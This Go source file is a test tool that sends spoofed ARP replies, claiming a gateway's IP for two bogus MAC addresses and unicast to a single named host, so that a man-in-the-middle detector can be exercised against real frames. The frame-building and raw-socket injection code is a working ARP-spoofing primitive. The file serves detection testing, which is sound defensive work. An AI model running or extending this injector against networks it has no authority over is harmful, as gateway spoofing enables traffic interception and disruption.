//go:build linux

// Command arpspooftest is a CONTAINED, authorised ARP-spoof injector used to
// prove mitmwatch's arp probe end to end against a real frame on the wire.
//
// It sends ARP replies claiming the gateway IP belongs to two bogus hardware
// addresses, UNICAST to one target's own MAC. The switch delivers them to that
// one port and nowhere else, so no other device on the network sees the frames
// or caches a wrong gateway - the blast radius is exactly the one host that
// asked to be tested. That host re-learns the real gateway from the next
// genuine ARP within seconds.
//
// This is not an attack tool. It has no discovery, no persistence, no
// forwarding, and it targets a single hardcoded host by explicit argument. It
// exists so the capture -> parse -> claims -> finding path can be exercised by a
// real on-wire ARP spoof rather than a crafted test frame.
//
//	arpspooftest -iface eth0 -gateway 10.0.4.1 -target-ip 10.0.4.48 -target-mac <pi-mac> -seconds 20
package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"golang.org/x/sys/unix"
)

func main() {
	iface := flag.String("iface", "eth0", "interface to send on")
	gateway := flag.String("gateway", "", "gateway IP to impersonate")
	targetIP := flag.String("target-ip", "", "the single host to send to (the sensor under test)")
	targetMAC := flag.String("target-mac", "", "that host's MAC (unicast destination; contains the blast radius)")
	seconds := flag.Int("seconds", 20, "how long to inject")
	flag.Parse()

	if *gateway == "" || *targetIP == "" || *targetMAC == "" {
		log.Fatal("need -gateway, -target-ip and -target-mac")
	}
	dstMAC, err := net.ParseMAC(*targetMAC)
	if err != nil {
		log.Fatalf("bad target-mac: %v", err)
	}
	gwIP := net.ParseIP(*gateway).To4()
	tIP := net.ParseIP(*targetIP).To4()
	if gwIP == nil || tIP == nil {
		log.Fatal("gateway and target-ip must be IPv4")
	}

	ifi, err := net.InterfaceByName(*iface)
	if err != nil {
		log.Fatalf("interface %s: %v", *iface, err)
	}

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ARP)))
	if err != nil {
		log.Fatalf("socket (need CAP_NET_RAW / root): %v", err)
	}
	defer unix.Close(fd)
	ll := &unix.SockaddrLinklayer{Protocol: htons(unix.ETH_P_ARP), Ifindex: ifi.Index, Halen: 6}
	copy(ll.Addr[:6], dstMAC)

	// Two distinct bogus source hardware addresses, both claiming the gateway.
	// Two claimants for one address in one capture window is what the probe's
	// gateway-impersonation rule looks for.
	spoofers := []net.HardwareAddr{
		{0xde, 0xad, 0xbe, 0xef, 0x00, 0x01},
		{0xde, 0xad, 0xbe, 0xef, 0x00, 0x02},
	}

	fmt.Printf("injecting spoofed ARP for %s from %d bogus MAC(s), unicast to %s only, for %ds\n",
		*gateway, len(spoofers), *targetMAC, *seconds)
	deadline := time.Now().Add(time.Duration(*seconds) * time.Second)
	sent := 0
	for time.Now().Before(deadline) {
		for _, src := range spoofers {
			frame := arpReply(dstMAC, src, gwIP, tIP, dstMAC)
			if err := unix.Sendto(fd, frame, 0, ll); err != nil {
				log.Fatalf("send: %v", err)
			}
			sent++
		}
		time.Sleep(250 * time.Millisecond)
	}
	fmt.Printf("done: %d frames sent. the target re-learns the real gateway on its next ARP.\n", sent)
	os.Exit(0)
}

// arpReply builds an Ethernet+ARP reply: senderMAC claims senderIP, addressed
// to (targetIP, targetMAC), with the Ethernet frame unicast to ethDst.
func arpReply(ethDst, senderMAC net.HardwareAddr, senderIP, targetIP net.IP, targetMAC net.HardwareAddr) []byte {
	b := make([]byte, 42)
	// Ethernet header.
	copy(b[0:6], ethDst)
	copy(b[6:12], senderMAC)
	binary.BigEndian.PutUint16(b[12:14], 0x0806) // ARP
	// ARP body.
	binary.BigEndian.PutUint16(b[14:16], 1)      // htype ethernet
	binary.BigEndian.PutUint16(b[16:18], 0x0800) // ptype ipv4
	b[18] = 6                                    // hlen
	b[19] = 4                                    // plen
	binary.BigEndian.PutUint16(b[20:22], 2)      // op = reply
	copy(b[22:28], senderMAC)
	copy(b[28:32], senderIP)
	copy(b[32:38], targetMAC)
	copy(b[38:42], targetIP)
	return b
}

func htons(v uint16) uint16 {
	var b [2]byte
	binary.BigEndian.PutUint16(b[:], v)
	return binary.NativeEndian.Uint16(b[:])
}
